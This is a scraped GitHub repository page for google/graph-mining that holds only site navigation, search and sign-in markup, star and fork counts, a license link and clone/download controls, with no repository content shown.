  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Packages&quot;,&quot;label&quot;:&quot;ref_cta:Packages;&quot;}" href="https://github.com/features/packages">
      
      <div>
        <p>Packages</p><p>
        Host and manage packages
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Security&quot;,&quot;label&quot;:&quot;ref_cta:Security;&quot;}" href="https://github.com/features/security">
      
      <div>
        <p>Security</p><p>
        Find and fix vulnerabilities
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Codespaces&quot;,&quot;label&quot;:&quot;ref_cta:Codespaces;&quot;}" href="https://github.com/features/codespaces">
      
      <div>
        <p>Codespaces</p><p>
        Instant dev environments
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Copilot&quot;,&quot;label&quot;:&quot;ref_cta:Copilot;&quot;}" href="https://github.com/features/copilot">
      
      <div>
        <p>Copilot</p><p>
        Write better code with AI
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Code review&quot;,&quot;label&quot;:&quot;ref_cta:Code review;&quot;}" href="https://github.com/features/code-review">
      
      <div>
        <p>Code review</p><p>
        Manage code changes
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Issues&quot;,&quot;label&quot;:&quot;ref_cta:Issues;&quot;}" href="https://github.com/features/issues">
      
      <div>
        <p>Issues</p><p>
        Plan and track work
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Discussions&quot;,&quot;label&quot;:&quot;ref_cta:Discussions;&quot;}" href="https://github.com/features/discussions">
      
      <div>
        <p>Discussions</p><p>
        Collaborate outside of code
      </p></div>

    
</a></li>

            </ul>
          </div>
          <div>
              <p><span id="product-explore-heading">Explore</span></p><ul aria-labelledby="product-explore-heading">
                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to All features&quot;,&quot;label&quot;:&quot;ref_cta:All features;&quot;}" href="https://github.com/features">
      All features

    
</a></li>

                <li>
  <a target="_blank" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Documentation&quot;,&quot;label&quot;:&quot;ref_cta:Documentation;&quot;}" href="https://docs.github.com/">
      Documentation

    
</a></li>

                <li>
  <a target="_blank" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to GitHub Skills&quot;,&quot;label&quot;:&quot;ref_cta:GitHub Skills;&quot;}" href="https://skills.github.com/">
      GitHub Skills

    
</a></li>

                <li>
  <a target="_blank" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Blog&quot;,&quot;label&quot;:&quot;ref_cta:Blog;&quot;}" href="https://github.blog/">
      Blog

    
</a></li>

            </ul>
          </div>
      </div>
</li>


                <li>
      
      <div>
          <div>
              <p><span id="solutions-for-heading">For</span></p><ul aria-labelledby="solutions-for-heading">
                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to Enterprise&quot;,&quot;label&quot;:&quot;ref_cta:Enterprise;&quot;}" href="https://github.com/enterprise">
      Enterprise

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to Teams&quot;,&quot;label&quot;:&quot;ref_cta:Teams;&quot;}" href="https://github.com/team">
      Teams

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to Startups&quot;,&quot;label&quot;:&quot;ref_cta:Startups;&quot;}" href="https://github.com/enterprise/startups">
      Startups

    
</a></li>

                <li>
  <a target="_blank" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to Education&quot;,&quot;label&quot;:&quot;ref_cta:Education;&quot;}" href="https://education.github.com/">
      Education

    
</a></li>

            </ul>
          </div>
          <div>
              <p><span id="solutions-by-solution-heading">By Solution</span></p><ul aria-labelledby="solutions-by-solution-heading">
                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to CI/CD &amp;amp; Automation&quot;,&quot;label&quot;:&quot;ref_cta:CI/CD &amp;amp; Automation;&quot;}" href="https://github.com/solutions/ci-cd/">
      CI/CD &amp; Automation

    
</a></li>

                <li>
  <a target="_blank" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to DevOps&quot;,&quot;label&quot;:&quot;ref_cta:DevOps;&quot;}" href="https://resources.github.com/devops/">
      DevOps

    
</a></li>

                <li>
  <a target="_blank" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to DevSecOps&quot;,&quot;label&quot;:&quot;ref_cta:DevSecOps;&quot;}" href="https://resources.github.com/devops/fundamentals/devsecops/">
      DevSecOps

    
</a></li>

            </ul>
          </div>
          <div>
              <p><span id="solutions-resources-heading">Resources</span></p><ul aria-labelledby="solutions-resources-heading">
                <li>
  <a target="_blank" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to Learning Pathways&quot;,&quot;label&quot;:&quot;ref_cta:Learning Pathways;&quot;}" href="https://resources.github.com/learn/pathways/">
      Learning Pathways

    
</a></li>

                <li>
  <a target="_blank" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to White papers, Ebooks, Webinars&quot;,&quot;label&quot;:&quot;ref_cta:White papers, Ebooks, Webinars;&quot;}" href="https://resources.github.com/">
      White papers, Ebooks, Webinars

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to Customer Stories&quot;,&quot;label&quot;:&quot;ref_cta:Customer Stories;&quot;}" href="https://github.com/customer-stories">
      Customer Stories

    
</a></li>

                <li>
  <a target="_blank" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to Partners&quot;,&quot;label&quot;:&quot;ref_cta:Partners;&quot;}" href="https://partner.github.com/">
      Partners

    
</a></li>

            </ul>
          </div>
      </div>
</li>


                <li>
      
      <div>
          <div>
            <ul>
                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Open Source&quot;,&quot;action&quot;:&quot;click to go to GitHub Sponsors&quot;,&quot;label&quot;:&quot;ref_cta:GitHub Sponsors;&quot;}" href="https://github.com/sponsors">
      
      <div>
        <p>GitHub Sponsors</p><p>
        Fund open source developers
      </p></div>

    
</a></li>

            </ul>
          </div>
          <div>
            <ul>
                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Open Source&quot;,&quot;action&quot;:&quot;click to go to The ReadME Project&quot;,&quot;label&quot;:&quot;ref_cta:The ReadME Project;&quot;}" href="https://github.com/readme">
      
      <div>
        <p>The ReadME Project</p><p>
        GitHub community articles
      </p></div>

    
</a></li>

            </ul>
          </div>
          <div>
              <p><span id="open-source-repositories-heading">Repositories</span></p><ul aria-labelledby="open-source-repositories-heading">
                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Open Source&quot;,&quot;action&quot;:&quot;click to go to Topics&quot;,&quot;label&quot;:&quot;ref_cta:Topics;&quot;}" href="https://github.com/topics">
      Topics

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Open Source&quot;,&quot;action&quot;:&quot;click to go to Trending&quot;,&quot;label&quot;:&quot;ref_cta:Trending;&quot;}" href="https://github.com/trending">
      Trending

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Open Source&quot;,&quot;action&quot;:&quot;click to go to Collections&quot;,&quot;label&quot;:&quot;ref_cta:Collections;&quot;}" href="https://github.com/collections">
      Collections

    
</a></li>

            </ul>
          </div>
      </div>
</li>


                <li>
    <a data-analytics-event="{&quot;category&quot;:&quot;Header menu top item (logged out)&quot;,&quot;action&quot;:&quot;click to go to Pricing&quot;,&quot;label&quot;:&quot;ref_cta:Pricing;&quot;}" href="https://github.com/pricing">Pricing</a>
</li>

            </ul>
          </nav>

        <div>
                


<qbsearch-input data-scope="repo:google/graph-mining" data-custom-scopes-path="/search/custom_scopes" data-delete-custom-scopes-csrf="TS3QoKfc2IPYUoICFpVo2Vq_OJwEQG4ezUV0KZ15uWK0-Dd-njoo8cNHwfCVEG07GmdfFG_jnsfcHPPLOSjuYw" data-max-custom-scopes="10" data-header-redesign-enabled="false" data-initial-value="" data-blackbird-suggestions-path="/search/suggestions" data-jump-to-suggestions-path="/_graphql/GetSuggestedNavigationDestinations" data-current-repository="google/graph-mining" data-current-org="google" data-current-owner="" data-logged-in="false">
  <div data-modal-dialog-overlay="" data-action="click:qbsearch-input#searchInputContainerClicked">
  <modal-dialog data-action="close:qbsearch-input#handleClose cancel:qbsearch-input#handleClose" data-target="qbsearch-input.searchSuggestionsDialog" role="dialog" id="search-suggestions-dialog" aria-modal="true" aria-labelledby="search-suggestions-dialog-header" data-view-component="true">
      <h2 id="search-suggestions-dialog-header">Search code, repositories, users, issues, pull requests...</h2>
    
</modal-dialog></div>
  
  <div>
    
<div data-modal-dialog-overlay="">
  <modal-dialog data-target="qbsearch-input.feedbackDialog" data-action="close:qbsearch-input#handleDialogClose cancel:qbsearch-input#handleDialogClose" role="dialog" id="feedback-dialog" aria-modal="true" aria-disabled="true" aria-labelledby="feedback-dialog-title" aria-describedby="feedback-dialog-description" data-view-component="true">
    <div data-view-component="true">
    <p>
      <h2 id="feedback-dialog-title">
        Provide feedback
      </h2>
    </p>
    
  </div>
      <div data-view-component="true">        <!-- '"` --><!-- </textarea></xmp> --><form id="code-search-feedback-form" data-turbo="false" action="/search/feedback" accept-charset="UTF-8" method="post">
          <p>We read every piece of feedback, and take your input very seriously.</p>
          
          
          <label for="include_email">Include my email address so I can be contacted</label>
</form></div>
      
</modal-dialog></div>

    <custom-scopes data-target="qbsearch-input.customScopesManager">
    
<div data-modal-dialog-overlay="">
  <modal-dialog data-target="custom-scopes.customScopesModalDialog" data-action="close:qbsearch-input#handleDialogClose cancel:qbsearch-input#handleDialogClose" role="dialog" id="custom-scopes-dialog" aria-modal="true" aria-disabled="true" aria-labelledby="custom-scopes-dialog-title" aria-describedby="custom-scopes-dialog-description" data-view-component="true">
    <div data-view-component="true">
    <p>
      <h2 id="custom-scopes-dialog-title">
        Saved searches
      </h2>
        <h2 id="custom-scopes-dialog-description">Use saved searches to filter your results more quickly</h2>
    </p>
    
  </div>
      
      
</modal-dialog></div>
    </custom-scopes>
  </div>
</qbsearch-input><div>
            <p><a href="https://github.com/login?return_to=https%3A%2F%2Fgithub.com%2Fgoogle%2Fgraph-mining" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header menu&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/google/graph-mining&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="73e2d2b0de1b008326d5fb468636efc41d9c02ac9911b800d296626ea61b2c86" data-ga-click="(Logged out) Header, clicked Sign in, text:sign-in">
              Sign in
            </a>
          </p></div>

            <p><a href="https://github.com/signup?ref_cta=Sign+up&amp;ref_loc=header+logged+out&amp;ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&amp;source=header-repo&amp;source_repo=google%2Fgraph-mining" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header menu&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/google/graph-mining&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="73e2d2b0de1b008326d5fb468636efc41d9c02ac9911b800d296626ea61b2c86" data-analytics-event="{&quot;category&quot;:&quot;Sign up&quot;,&quot;action&quot;:&quot;click to sign up for account&quot;,&quot;label&quot;:&quot;ref_page:/<user-name>/<repo-name>;ref_cta:Sign up;ref_loc:header logged out&quot;}">
              Sign up
            </a>
        </p></div>
      </div>
  </div>
</header>

      
    </div>

  








    


    
    <include-fragment data-base-src="https://github.com/notifications/beta/shelf"></include-fragment>






  <div itemscope="" itemtype="http://schema.org/SoftwareSourceCode" data-commit-hovercards-enabled="" data-discussion-hovercards-enabled="" data-issue-and-pr-hovercards-enabled="">
    <main id="js-repo-pjax-container">
      
      
  





    
    

    






  
  <div id="repository-container-header" data-turbo-replace="">

      <div>

        <div>
      
    
    <p><span itemprop="author">
      <a rel="author" data-hovercard-type="organization" data-hovercard-url="/orgs/google/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/google">
        google
</a>    </span>
    <span>/</span>
    <strong itemprop="name">
      <a data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" href="https://github.com/google/graph-mining">graph-mining</a>
    </strong>

    <span></span><span>Public</span>
  </p></div>

        <div id="repository-details-container" data-turbo-replace="">
            <ul>
    
      

  <li>
            <a href="https://github.com/login?return_to=%2Fgoogle%2Fgraph-mining" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;notification subscription menu watch&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/google/graph-mining&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="f4edbd2d3226daa305e9b01fff9f3937e084479b0ef9459d3c1829990d34df4e" aria-label="You must be signed in to change notification settings" data-view-component="true">    Notifications
</a>
  </li>

  <li>
          <a icon="repo-forked" id="fork-button" href="https://github.com/login?return_to=%2Fgoogle%2Fgraph-mining" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;repo details fork button&quot;,&quot;repository_id&quot;:389477745,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/google/graph-mining&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="fc861c424dd0f860f742af0ee10fc5bd1ebcdcfcf0017744d9cea0aba8a814a8" data-view-component="true">    Fork
    <span id="repo-network-counter" data-pjax-replace="true" data-turbo-replace="true" title="6" data-view-component="true">6</span>
</a>
  </li>

  <li>
        <div data-view-component="true">
        <a href="https://github.com/login?return_to=%2Fgoogle%2Fgraph-mining" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;star button&quot;,&quot;repository_id&quot;:389477745,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/google/graph-mining&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="ce4377d60b45e684cca5fab16552ad973cf8447c360d6bcc7091ef616538cb65" aria-label="You must be signed in to star a repository" data-view-component="true">    <span data-view-component="true">
          Star
</span>          <span id="repo-stars-counter-star" aria-label="171 users starred this repository" data-singular-suffix="user starred this repository" data-plural-suffix="users starred this repository" data-turbo-replace="true" title="171" data-view-component="true">171</span>
</a>        </div>
  </li>

</ul>

        </div>
      </div>

        <div id="responsive-meta-container" data-turbo-replace="">

    <h3>License</h3>
  <p>
    <a href="https://github.com/google/graph-mining/blob/main/LICENSE" data-analytics-event="{&quot;category&quot;:&quot;Repository Overview&quot;,&quot;action&quot;:&quot;click&quot;,&quot;label&quot;:&quot;location:sidebar;file:license&quot;}">
      
     Apache-2.0 license
    </a>
  </p>


    <p>
        <a href="https://github.com/google/graph-mining/stargazers">
          
          <span>171</span>
          stars
</a>        <a href="https://github.com/google/graph-mining/forks">
          
          <span>6</span>
          forks
</a>        <a href="https://github.com/google/graph-mining/activity">
          
          <span>Activity</span>
</a>    </p>

      <div>
        <div data-view-component="true">
        <a href="https://github.com/login?return_to=%2Fgoogle%2Fgraph-mining" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;star button&quot;,&quot;repository_id&quot;:389477745,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/google/graph-mining&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="ce4377d60b45e684cca5fab16552ad973cf8447c360d6bcc7091ef616538cb65" aria-label="You must be signed in to star a repository" data-view-component="true">    <span data-view-component="true">
          Star
</span>
</a>        </div>
        <p>
                <a href="https://github.com/login?return_to=%2Fgoogle%2Fgraph-mining" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;notification subscription menu watch&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/google/graph-mining&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="f4edbd2d3226daa305e9b01fff9f3937e084479b0ef9459d3c1829990d34df4e" aria-label="You must be signed in to change notification settings" data-view-component="true">    Notifications
</a>
        </p>
      </div>
  </div>


          <nav data-pjax="#js-repo-pjax-container" aria-label="Repository" data-view-component="true">

  <ul data-view-component="true">
      <li data-view-component="true">
  <a id="code-tab" href="https://github.com/google/graph-mining" data-tab-item="i0code-tab" data-selected-links="repo_source repo_downloads repo_commits repo_releases repo_tags repo_branches repo_packages repo_deployments /google/graph-mining" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g c" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Code&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" aria-current="page" data-view-component="true">
    
              
        <span data-content="Code">Code</span>
          <span id="code-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="Not available" data-view-component="true"></span>


    
</a></li>
      <li data-view-component="true">
  <a id="issues-tab" href="https://github.com/google/graph-mining/issues" data-tab-item="i1issues-tab" data-selected-links="repo_issues repo_labels repo_milestones /google/graph-mining/issues" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g i" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Issues&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true">
    
              
        <span data-content="Issues">Issues</span>
          


    
</a></li>
      <li data-view-component="true">
  <a id="pull-requests-tab" href="https://github.com/google/graph-mining/pulls" data-tab-item="i2pull-requests-tab" data-selected-links="repo_pulls checks /google/graph-mining/pulls" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g p" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Pull requests&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true">
    
              
        <span data-content="Pull requests">Pull requests</span>
          


    
</a></li>
      <li data-view-component="true">
  <a id="actions-tab" href="https://github.com/google/graph-mining/actions" data-tab-item="i3actions-tab" data-selected-links="repo_actions /google/graph-mining/actions" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g a" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Actions&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true">
    
              
        <span data-content="Actions">Actions</span>
          <span id="actions-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="Not available" data-view-component="true"></span>


    
</a></li>
      <li data-view-component="true">
  <a id="projects-tab" href="https://github.com/google/graph-mining/projects" data-tab-item="i4projects-tab" data-selected-links="repo_projects new_repo_project repo_project /google/graph-mining/projects" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g b" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Projects&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true">
    
              
        <span data-content="Projects">Projects</span>
          


    
</a></li>
      <li data-view-component="true">
  <a id="security-tab" href="https://github.com/google/graph-mining/security" data-tab-item="i5security-tab" data-selected-links="security overview alerts policy token_scanning code_scanning /google/graph-mining/security" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g s" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Security&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true">
    
              
        <span data-content="Security">Security</span>
          <include-fragment src="/google/graph-mining/security/overall-count" accept="text/fragment+html"></include-fragment>

    
</a></li>
      <li data-view-component="true">
  <a id="insights-tab" href="https://github.com/google/graph-mining/pulse" data-tab-item="i6insights-tab" data-selected-links="repo_graphs repo_contributors dependency_graph dependabot_updates pulse people community /google/graph-mining/pulse" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Insights&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true">
    
              
        <span data-content="Insights">Insights</span>
          <span id="insights-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="Not available" data-view-component="true"></span>


    
</a></li>
</ul>
    <div data-view-component="true">        <details data-view-component="true">
    <summary role="button" data-view-component="true">          <div>
            
            <p><span>More</span>
          </p></div>
</summary>
    <details-menu role="menu" data-view-component="true">
          <ul>
              
              
              
              
              
              
              
          </ul>
</details-menu>
</details></div>
</nav>

  </div>

  



<turbo-frame id="repo-content-turbo-frame" target="_top" data-turbo-action="advance">
    <div id="repo-content-pjax-container">
  


  

  <include-fragment src="/google/graph-mining/spoofed_commit_check/c1c54b486f7a8a5f83a88ead02a211a9372e33b0" data-test-selector="spoofed-commit-check"></include-fragment>

  <div data-view-component="true">
  <div data-view-component="true">        
        
        <div>
  
<div>
  <details id="branch-select-menu" data-hydro-click-payload="{&quot;event_type&quot;:&quot;repository.click&quot;,&quot;payload&quot;:{&quot;target&quot;:&quot;REFS_SELECTOR_MENU&quot;,&quot;repository_id&quot;:389477745,&quot;originating_url&quot;:&quot;https://github.com/google/graph-mining&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="793927d0e8b757a802264854cff8e7f6df6255e8df46c96117c067ca25207868">
    <summary data-hotkey="w" title="Switch branches or tags">
      
      <span data-menu-button="">main</span>
      <span></span>
    </summary>

    
<div>
    <header>
      <span>Switch branches/tags</span>
      
    </header>

    <input-demux data-action="tab-container-change:input-demux#storeInput tab-container-changed:input-demux#updateInput">
      <tab-container>
        

        

        <div role="tabpanel" id="ref-list-branches" data-filter-placeholder="Filter branches/tags" tabindex="">
          <ref-selector type="branch" data-targets="input-demux.sinks" data-action="
              input-entered:ref-selector#inputEntered
              tab-selected:ref-selector#tabSelected
              focus-list:ref-selector#focusFirstListMember
            " query-endpoint="/google/graph-mining/refs" cache-key="v0:1627264726.048119" current-committish="bWFpbg==" default-branch="bWFpbg==" name-with-owner="Z29vZ2xlL2dyYXBoLW1pbmluZw==" prefetch-on-mouseover="">

            <template data-target="ref-selector.fetchFailedTemplate">
              <div class="SelectMenu-message" data-index="{{ index }}">Could not load branches</div>
            </template>

              <template data-target="ref-selector.noMatchTemplate">
    <div class="SelectMenu-message">Nothing to show</div>
</template>


            

              

<template data-target="ref-selector.itemTemplate">
  <a href="https://github.com/google/graph-mining/tree/{{ urlEncodedRefName }}" class="SelectMenu-item" role="menuitemradio" rel="nofollow" aria-checked="{{ isCurrent }}" data-index="{{ index }}">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check SelectMenu-icon SelectMenu-icon--check">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
    <span class="flex-1 css-truncate css-truncate-overflow {{ isFilteringClass }}">{{ refName }}</span>
    <span hidden="{{ isNotDefault }}" class="Label Label--secondary flex-self-start">default</span>
  </a>
</template>


              
          </ref-selector>

        </div>

        
      </tab-container>
    </input-demux>
  </div>

  </details>

</div>


<div data-modal-dialog-overlay="">
  <modal-dialog role="dialog" id="warn-tag-match-create-branch-dialog" aria-modal="true" aria-labelledby="warn-tag-match-create-branch-dialog-header" data-view-component="true">
      <header>
        <div>
          <p>
            <h2 id="warn-tag-match-create-branch-dialog-header">Name already in use</h2>
          </p>
          
        </div>
      </header>
    <div>
      
          <p>      A tag already exists with the provided branch name. Many Git commands accept both tag and branch names, so creating this branch may cause unexpected behavior. Are you sure you want to create this branch?
</p>

    </div>
      
</modal-dialog></div>



  <p>
    <a data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" href="https://github.com/google/graph-mining/branches">
          
          <strong>1</strong>
          <span>branch</span>
    </a>
    <a data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" href="https://github.com/google/graph-mining/tags">
      
        <strong>0</strong>
        <span>tags</span>
    </a>
  </p>

  

  <include-fragment src="/google/graph-mining/overview_actions/main"></include-fragment>


    <p><span>
        
<get-repo>
    
    <details data-action="
               toggle:get-repo#onDetailsToggle
               keydown:get-repo#onDetailsKeydown">
        <summary data-hydro-click="{&quot;event_type&quot;:&quot;repository.click&quot;,&quot;payload&quot;:{&quot;repository_id&quot;:389477745,&quot;target&quot;:&quot;CLONE_OR_DOWNLOAD_BUTTON&quot;,&quot;originating_url&quot;:&quot;https://github.com/google/graph-mining&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="c7dcf1fb8c9b620d1955a014a722ef2adb656b42264d20955ad62fc05b191511" data-view-component="true">    <span>
      <span>Code</span>
    </span>
      <span>
        
      </span>
</summary>  
      <div data-target="get-repo.modal">
    <tab-container data-view-component="true">
  <div with_panel="true" data-view-component="true">
    
    <ul role="tablist" aria-label="Choose where to access your code" data-view-component="true">
        <li role="presentation" data-view-component="true">
  </li>
        <li role="presentation" data-view-component="true">
  </li>
</ul>    
</div>    <div id="local-panel" role="tabpanel" tabindex="0" aria-labelledby="local-tab" data-view-component="true">          <ul>
              <li>
  <a href="https://docs.github.com/articles/which-remote-url-should-i-use" rel="noopener" target="_blank" aria-label="Which remote URL should I use?">
  
</a>

<div>
  <p>
  Clone
</p></div>

<tab-container>

  

  <div role="tabpanel">
    

    <p>
        Use Git or checkout with SVN using the web URL.
    </p>
  </div>


  
</tab-container>

</li>
<li data-platforms="windows,mac">
  <a data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;OPEN_IN_DESKTOP&quot;,&quot;git_repository_type&quot;:&quot;REPOSITORY&quot;,&quot;repository_id&quot;:389477745,&quot;originating_url&quot;:&quot;https://github.com/google/graph-mining&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="dbdb1793a8cc4d814be5c72e7a04178035786fce7ec03d49c543906902778098" data-action="click:get-repo#showDownloadMessage" href="https://desktop.github.com/">
    
    Open with GitHub Desktop
</a></li>
<li>
  <a rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;DOWNLOAD_ZIP&quot;,&quot;git_repository_type&quot;:&quot;REPOSITORY&quot;,&quot;repository_id&quot;:389477745,&quot;originating_url&quot;:&quot;https://github.com/google/graph-mining&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="4821d2c47444b6f65bd4501e666123a43fff352c949914e0ff1cc083bb57c9cf" data-ga-click="Repository, download zip, location:repo overview" data-open-app="link" data-turbo="false" href="https://github.com/google/graph-mining/archive/refs/heads/main.zip">
    
    Download ZIP
</a></li>

          </ul>
</div>
    
</tab-container>    
</div>
    </details>


</get-repo>

